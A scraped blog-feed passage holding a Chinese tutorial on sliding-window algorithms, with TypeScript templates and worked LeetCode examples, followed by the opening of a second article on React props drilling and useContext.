<p>滑动窗口的核心逻辑一致，但根据问题目标（求最长、求最短、求计数）的不同，缩窗口的条件和更新答案的时机会有差异。按目标可分为三大类，覆盖绝大多数经典场景：</p>

































<table><thead><tr><th>分类</th><th>核心目标</th><th>缩窗口条件</th><th>更新答案时机</th><th>典型问题</th></tr></thead><tbody><tr><td>类型1：求最长/最大区间</td><td>找到满足“好状态”的最长连续区间</td><td>窗口进入“坏状态”时，缩 left 至回到“好状态”</td><td>缩窗口完成后，每次扩展 right 后更新</td><td>无重复字符的最长子串、最长重复子数组</td></tr><tr><td>类型2：求最短/最小区间</td><td>找到满足“好状态”的最短连续区间</td><td>窗口进入“好状态”时，缩 left 至回到“坏状态”（尽可能缩小窗口）</td><td>缩窗口过程中，每次缩小 left 后更新</td><td>长度最小的子数组、最小覆盖子串</td></tr><tr><td>类型3：求计数/统计区间</td><td>统计所有满足“好状态”的连续区间个数</td><td>窗口进入“坏状态”时，缩 left 至回到“好状态”</td><td>缩窗口完成后，累加当前 right 对应的有效区间数（right-left+1）</td><td>乘积小于 K 的子数组、找到字符串中所有字母异位词</td></tr></tbody></table>
<h2 data-id="heading-6">三、适用场景：3个核心判断标准</h2>
<p>并非所有子串/子数组问题都能用滑动窗口，需满足以下 3 个核心条件，缺一不可：</p>
<ol>
<li>
<p><strong>问题对象是连续区间</strong>：滑动窗口仅适用于“连续子串”或“连续子数组”问题，非连续区间（如子序列）不适用。</p>
</li>
<li>
<p><strong>窗口状态具有单调性</strong>：需满足前文提到的两条规律之一，即扩展/缩小窗口时，状态变化是单向的。反例：“找和为 target 的子数组（含负数值）”，窗口 [left, right] 和为 target 时，扩展 right 可能因负数导致和变小，打破单调性，无法用滑动窗口。</p>
</li>
<li>
<p><strong>状态可快速更新</strong>：加入 right 元素或移出 left 元素时，窗口的状态（如和、积、字符频率）能在 O(1) 时间内更新，无需重新计算整个窗口状态。</p>
</li>
</ol>
<h2 data-id="heading-7">四、通用模板：3类场景统一框架</h2>
<p>基于上述分类，提炼出通用模板，只需根据目标调整「缩窗口条件」和「更新答案时机」即可。模板核心步骤：初始化变量 → 扩窗口 → 缩窗口 → 更新答案。</p>
<h3 data-id="heading-8">4.0 快速参考表</h3>

































<table><thead><tr><th>类型</th><th>初始 ans</th><th>缩窗口条件</th><th>更新答案时机</th><th>关键代码</th></tr></thead><tbody><tr><td><strong>类型1：求最长</strong></td><td><code>0</code></td><td>进入坏状态</td><td>缩窗口后，每次扩展 right 后</td><td><code>ans = Math.max(ans, right - left + 1)</code></td></tr><tr><td><strong>类型2：求最短</strong></td><td><code>Infinity</code></td><td>进入好状态</td><td>缩窗口过程中</td><td><code>ans = Math.min(ans, right - left + 1)</code></td></tr><tr><td><strong>类型3：求计数</strong></td><td><code>0</code></td><td>进入坏状态</td><td>缩窗口后</td><td><code>ans += right - left + 1</code></td></tr></tbody></table>
<h3 data-id="heading-9">4.1 通用模板（TypeScript/JavaScript）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> slidingWindowTemplate&lt;T&gt;(<span class="hljs-attr">data</span>: T[], <span class="hljs-attr">targetParam</span>: <span class="hljs-built_in">any</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-comment">// 1. 初始化变量</span>
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>; <span class="hljs-comment">// 左窗口边界</span>
  <span class="hljs-keyword">let</span> ans = 初始值; <span class="hljs-comment">// 答案变量（最长→0，最短→Infinity，计数→0）</span>
  <span class="hljs-keyword">let</span> status = 初始状态; <span class="hljs-comment">// 如对象（字符频率）、sum=0、prod=1</span>

  <span class="hljs-comment">// 2. 扩窗口：right 遍历所有元素</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    <span class="hljs-comment">// 加入右元素，更新状态</span>
    <span class="hljs-comment">// status.update(rightVal); // 根据具体类型更新</span>

    <span class="hljs-comment">// 3. 缩窗口：根据目标和当前状态判断是否缩左</span>
    <span class="hljs-keyword">while</span> (缩窗口条件) {
      <span class="hljs-comment">// 核心差异点：不同类型场景条件不同</span>
      <span class="hljs-keyword">const</span> leftVal = data[left];
      <span class="hljs-comment">// 移出左元素，更新状态</span>
      <span class="hljs-comment">// status.remove(leftVal); // 根据具体类型更新</span>
      left++; <span class="hljs-comment">// 缩小窗口</span>
    }

    <span class="hljs-comment">// 4. 更新答案：根据类型调整时机</span>
    <span class="hljs-comment">// 答案更新逻辑</span>
    <span class="hljs-comment">// 核心差异点：不同类型场景时机不同</span>
  }

  <span class="hljs-comment">// 5. 处理边界情况（如无满足条件的窗口）</span>
  <span class="hljs-keyword">return</span> 处理后的 ans;
}
</code></pre>
<h3 data-id="heading-10">4.2 分类型模板细化</h3>
<h4 data-id="heading-11">类型1：求最长/最大区间</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> maxLengthTemplate&lt;T&gt;(<span class="hljs-attr">data</span>: T[], <span class="hljs-attr">param</span>: <span class="hljs-built_in">any</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// 最长初始为0</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">status</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt; = {}; <span class="hljs-comment">// 对象：记录字符频率</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    <span class="hljs-comment">// 更新状态</span>
    status[rightVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>] = status[rightVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>] ? status[rightVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>] + <span class="hljs-number">1</span> : <span class="hljs-number">1</span>;

    <span class="hljs-comment">// 缩窗口条件：进入坏状态</span>
    <span class="hljs-keyword">while</span> (坏状态判断) {
      <span class="hljs-comment">// 如 status[rightVal] &gt; 1（重复字符）</span>
      <span class="hljs-keyword">const</span> leftVal = data[left];
      status[leftVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>]--;
      left++;
    }

    <span class="hljs-comment">// 更新答案：缩窗口后，当前窗口是有效最长窗口</span>
    ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(ans, right - left + <span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h4 data-id="heading-12">类型2：求最短/最小区间</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">minLengthTemplate</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span>[], param: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-title class_">Infinity</span>; <span class="hljs-comment">// 最短初始为无穷大</span>
  <span class="hljs-keyword">let</span> status = <span class="hljs-number">0</span>; <span class="hljs-comment">// 如 sumWindow = 0</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    status += rightVal; <span class="hljs-comment">// 更新状态</span>

    <span class="hljs-comment">// 缩窗口条件：进入好状态（尽可能缩小窗口）</span>
    <span class="hljs-keyword">while</span> (好状态判断) {
      <span class="hljs-comment">// 如 status &gt;= target（和≥目标）</span>
      <span class="hljs-comment">// 缩窗口时更新答案</span>
      ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(ans, right - left + <span class="hljs-number">1</span>);
      <span class="hljs-keyword">const</span> leftVal = data[left];
      status -= leftVal;
      left++;
    }
  }

  <span class="hljs-comment">// 处理边界：无满足条件的窗口返回0</span>
  <span class="hljs-keyword">return</span> ans !== <span class="hljs-title class_">Infinity</span> ? ans : <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-13">类型3：求计数/统计区间</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">countTemplate</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span>[], param: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// 计数初始为0</span>
  <span class="hljs-keyword">let</span> status = <span class="hljs-number">1</span>; <span class="hljs-comment">// 如 prod = 1</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    status *= rightVal; <span class="hljs-comment">// 更新状态</span>

    <span class="hljs-comment">// 缩窗口条件：进入坏状态</span>
    <span class="hljs-keyword">while</span> (坏状态判断) {
      <span class="hljs-comment">// 如 status &gt;= K（乘积≥K）</span>
      <span class="hljs-keyword">const</span> leftVal = data[left];
      status /= leftVal;
      left++;
    }

    <span class="hljs-comment">// 更新答案：当前right对应的有效区间数 = right-left+1</span>
    ans += right - left + <span class="hljs-number">1</span>;
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h2 data-id="heading-14">五、经典例题实战：逐行拆解</h2>
<p>结合模板，拆解 3 类场景的经典例题，帮你理解如何将模板落地到具体问题。</p>
<h3 data-id="heading-15">例题1：无重复字符的最长子串（类型1：求最长）</h3>
<h4 data-id="heading-16">题目描述</h4>
<p>给定一个字符串 s，请你找出其中不含有重复字符的最长子串的长度。</p>
<h4 data-id="heading-17">解题思路</h4>
<ul>
<li><strong>窗口状态（坏）</strong>：窗口内存在重复字符；</li>
<li><strong>状态统计</strong>：用对象记录窗口内字符的出现次数；</li>
<li><strong>缩窗口条件</strong>：当前加入的字符出现次数&gt;1（进入坏状态）；</li>
<li><strong>更新答案</strong>：缩窗口完成后，计算当前窗口长度，更新最大值。</li>
</ul>
<h4 data-id="heading-18">代码实现</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">lengthOfLongestSubstring</span>(<span class="hljs-params">s: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// 最长子串长度初始为0</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">window</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt; = {}; <span class="hljs-comment">// 对象：记录窗口内字符出现次数</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; s.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightChar = s[right];
    <span class="hljs-comment">// 加入右字符，更新状态</span>
    <span class="hljs-variable language_">window</span>[rightChar] = <span class="hljs-variable language_">window</span>[rightChar] ? <span class="hljs-variable language_">window</span>[rightChar] + <span class="hljs-number">1</span> : <span class="hljs-number">1</span>;

    <span class="hljs-comment">// 缩窗口：当当前字符出现次数&gt;1（坏状态），缩左直到无重复</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">window</span>[rightChar] &gt; <span class="hljs-number">1</span>) {
      <span class="hljs-keyword">const</span> leftChar = s[left];
      <span class="hljs-variable language_">window</span>[leftChar]--; <span class="hljs-comment">// 移出左字符，更新状态</span>
      left++;
    }

    <span class="hljs-comment">// 更新答案：当前窗口是无重复的有效窗口，计算长度</span>
    ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(ans, right - left + <span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h4 data-id="heading-19">复杂度分析</h4>
<p>时间复杂度 O(n)：每个字符被 right 加入、left 移出各一次；空间复杂度 O(min(m, n)))：m 是字符集大小，窗口内字符数不超过 min(m, n)。</p>
<h3 data-id="heading-20">例题2：长度最小的子数组（类型2：求最短）</h3>
<h4 data-id="heading-21">题目描述</h4>
<p>给定一个含有 n 个正整数的数组和一个正整数 target，找出该数组中满足其和 ≥ target 的长度最小的 连续子数组，并返回其长度。如果不存在符合条件的子数组，返回 0。</p>
<h4 data-id="heading-22">解题思路</h4>
<ul>
<li><strong>窗口状态（好）</strong>：窗口和≥target；</li>
<li><strong>状态统计</strong>：用 sumWindow 记录窗口内元素和；</li>
<li><strong>缩窗口条件</strong>：sumWindow≥target（进入好状态），缩左以寻找更短窗口；</li>
<li><strong>更新答案</strong>：缩窗口过程中，每次缩小后计算窗口长度，更新最小值。</li>
</ul>
<h4 data-id="heading-23">代码实现</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">minSubArrayLen</span>(<span class="hljs-params">target: <span class="hljs-built_in">number</span>, nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-title class_">Infinity</span>; <span class="hljs-comment">// 最短长度初始为无穷大</span>
  <span class="hljs-keyword">let</span> sumWindow = <span class="hljs-number">0</span>; <span class="hljs-comment">// 窗口内元素和</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; nums.<span class="hljs-property">length</span>; right++) {
    sumWindow += nums[right]; <span class="hljs-comment">// 加入右元素，更新和</span>

    <span class="hljs-comment">// 缩窗口：和≥target时，尽可能缩小窗口</span>
    <span class="hljs-keyword">while</span> (sumWindow &gt;= target) {
      <span class="hljs-comment">// 缩窗口时更新答案：当前窗口是有效最短窗口候选</span>
      ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(ans, right - left + <span class="hljs-number">1</span>);
      sumWindow -= nums[left]; <span class="hljs-comment">// 移出左元素，更新和</span>
      left++;
    }
  }

  <span class="hljs-comment">// 处理边界：无满足条件的窗口返回0</span>
  <span class="hljs-keyword">return</span> ans !== <span class="hljs-title class_">Infinity</span> ? ans : <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-24">复杂度分析</h4>
<p>时间复杂度 O(n)：每个元素最多被遍历两次；空间复杂度 O(1)：仅用常数级变量。</p>
<h3 data-id="heading-25">例题3：乘积小于 K 的子数组（类型3：求计数）</h3>
<h4 data-id="heading-26">题目描述</h4>
<p>给你一个整数数组 nums 和一个整数 k，统计并返回该数组中乘积小于 k 的连续子数组的个数。</p>
<h4 data-id="heading-27">解题思路</h4>
<ul>
<li><strong>窗口状态（坏）</strong>：窗口乘积≥k；</li>
<li><strong>状态统计</strong>：用 prod 记录窗口内元素乘积；</li>
<li><strong>缩窗口条件</strong>：prod≥k（进入坏状态），缩左直到乘积&lt;k；</li>
<li><strong>更新答案</strong>：缩窗口完成后，当前 right 对应的有效子数组数为 right-left+1（即 [left,right]、[left+1,right]...[right,right]）。</li>
</ul>
<h4 data-id="heading-28">代码实现</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">numSubarrayProductLessThanK</span>(<span class="hljs-params">nums: <span class="hljs-built_in">number</span>[], k: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-comment">// 边界条件：k≤1时，所有正整数乘积≥1，无满足条件的子数组</span>
  <span class="hljs-keyword">if</span> (k &lt;= <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// 计数初始为0</span>
  <span class="hljs-keyword">let</span> prod = <span class="hljs-number">1</span>; <span class="hljs-comment">// 窗口内元素乘积</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; nums.<span class="hljs-property">length</span>; right++) {
    prod *= nums[right]; <span class="hljs-comment">// 加入右元素，更新乘积</span>

    <span class="hljs-comment">// 缩窗口：乘积≥k时，缩左直到乘积&lt;k</span>
    <span class="hljs-keyword">while</span> (prod &gt;= k) {
      prod /= nums[left]; <span class="hljs-comment">// 移出左元素，更新乘积</span>
      left++;
    }

    <span class="hljs-comment">// 累加当前right对应的有效子数组数</span>
    <span class="hljs-comment">// 当窗口 [left, right] 的乘积 &lt; k 时，以 right 结尾的所有子数组都满足条件</span>
    <span class="hljs-comment">// 即 [left,right]、[left+1,right]...[right,right] 共 right-left+1 个</span>
    ans += right - left + <span class="hljs-number">1</span>;
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h4 data-id="heading-29">复杂度分析</h4>
<p>时间复杂度 O(n)：每个元素最多被遍历两次；空间复杂度 O(1)：仅用常数级变量。</p>
<h2 data-id="heading-30">六、新手避坑指南</h2>
<ol>
<li>
<p><strong>窗口边界统一</strong>：建议全程使用「左闭右闭」或「左闭右开」边界定义，不要混用。本文所有例题均采用「左闭右闭」，窗口长度为 right-left+1。</p>
</li>
<li>
<p><strong>状态更新顺序</strong>：缩窗口时，需先更新状态（如减 sum、除 prod），再移动 left 指针，避免漏算或多算。</p>
</li>
<li>
<p><strong>边界条件处理</strong>：</p>
<ul>
<li>
<p>求最短时，初始 ans 设为无穷大，最后需判断是否更新过（未更新则返回 0）；</p>
</li>
<li>
<p>乘积问题需注意 k≤1 的情况（正整数乘积最小为 1，直接返回 0）；</p>
</li>
<li>
<p>空字符串/空数组需提前返回 0。</p>
</li>
</ul>
</li>
<li>
<p><strong>单调性验证</strong>：遇到子串/子数组问题时，先手动模拟 2-3 个案例，确认状态是否满足单调性，再决定是否用滑动窗口。</p>
</li>
</ol>
<h2 data-id="heading-31">七、总结</h2>
<p>滑动窗口的核心是「用单调性压缩遍历维度」，剪枝只是优化手段。掌握它的关键在于：</p>
<ol>
<li>
<p>判断问题是否满足「连续区间+状态单调性+状态可快速更新」；</p>
</li>
<li>
<p>根据目标（最长/最短/计数）确定「缩窗口条件」和「更新答案时机」；</p>
</li>
<li>
<p>套用通用模板，灵活调整状态统计工具（哈希表/和/积）。</p>
</li>
</ol>
<p>只要抓住这三点，无论是简单的“无重复子串”，还是复杂的“最小覆盖子串”，都能按此逻辑拆解。建议多做几道经典例题，固化模板思维，面试时就能快速反应。</p>
<h3 data-id="heading-32">练习题推荐</h3>
<p>按难度和类型分类，建议按顺序练习：</p>
<h4 data-id="heading-33">基础题（必做）</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-substring-without-repeating-characters%2F" target="_blank" title="https://leetcode.cn/problems/longest-substring-without-repeating-characters/" ref="nofollow noopener noreferrer">3. 无重复字符的最长子串</a> - 类型1：求最长</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fminimum-size-subarray-sum%2F" target="_blank" title="https://leetcode.cn/problems/minimum-size-subarray-sum/" ref="nofollow noopener noreferrer">209. 长度最小的子数组</a> - 类型2：求最短</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fsubarray-product-less-than-k%2F" target="_blank" title="https://leetcode.cn/problems/subarray-product-less-than-k/" ref="nofollow noopener noreferrer">713. 乘积小于 K 的子数组</a> - 类型3：求计数</li>
</ul>
<h4 data-id="heading-34">进阶题（推荐）</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-all-anagrams-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-all-anagrams-in-a-string/" ref="nofollow noopener noreferrer">438. 找到字符串中所有字母异位词</a> - 类型3：固定窗口</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fminimum-window-substring%2F" target="_blank" title="https://leetcode.cn/problems/minimum-window-substring/" ref="nofollow noopener noreferrer">76. 最小覆盖子串</a> - 类型2：复杂场景</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fpermutation-in-string%2F" target="_blank" title="https://leetcode.cn/problems/permutation-in-string/" ref="nofollow noopener noreferrer">567. 字符串的排列</a> - 类型3：固定窗口变种</li>
</ul>
<h4 data-id="heading-35">扩展题（挑战）</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fsliding-window-maximum%2F" target="_blank" title="https://leetcode.cn/problems/sliding-window-maximum/" ref="nofollow noopener noreferrer">239. 滑动窗口最大值</a> - 需要结合单调队列</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-repeating-character-replacement%2F" target="_blank" title="https://leetcode.cn/problems/longest-repeating-character-replacement/" ref="nofollow noopener noreferrer">424. 替换后的最长重复字符</a> - 类型1：变种</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 跨层级组件通信：从 Props Drilling 到 useContext 的实战剖析]]></title>    <link>https://juejin.cn/post/7589201772117835782</link>    <guid>https://juejin.cn/post/7589201772117835782</guid>    <pubDate>2025-12-29T10:28:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772117835782" data-draft-id="7589082912588628011" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 跨层级组件通信：从 Props Drilling 到 useContext 的实战剖析"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2025-12-29T10:28:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="超级赛亚人_"/> <meta itemprop="url" content="https://juejin.cn/user/793196846923641"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 跨层级组件通信：从 Props Drilling 到 useContext 的实战剖析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793196846923641/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    超级赛亚人_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:28:40.000Z" title="Mon Dec 29 2025 10:28:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 React 开发中，组件通信是日常中最常见的任务之一。父子组件间通过 props 传递数据简单高效，但当数据需要传递到多层嵌套的子组件时，“Props Drilling”（属性穿透）问题就会显现：中间层组件明明不需要这些数据，却不得不被动接收并向下传递。这不仅让代码冗余，还降低了可维护性。</p>
<p>React 官方提供的 Context API 正是为此而生。它允许我们在组件树的最外层“提供”数据，任何深层组件都可以直接“消费”它，而无需层层传递。本文将通过一个用户信息的实际例子，对比两种方式，帮助你理解何时、何地该使用 useContext 解决跨层级通信问题。</p>
<h2 data-id="heading-0">Props Drilling：传统方式的痛点</h2>
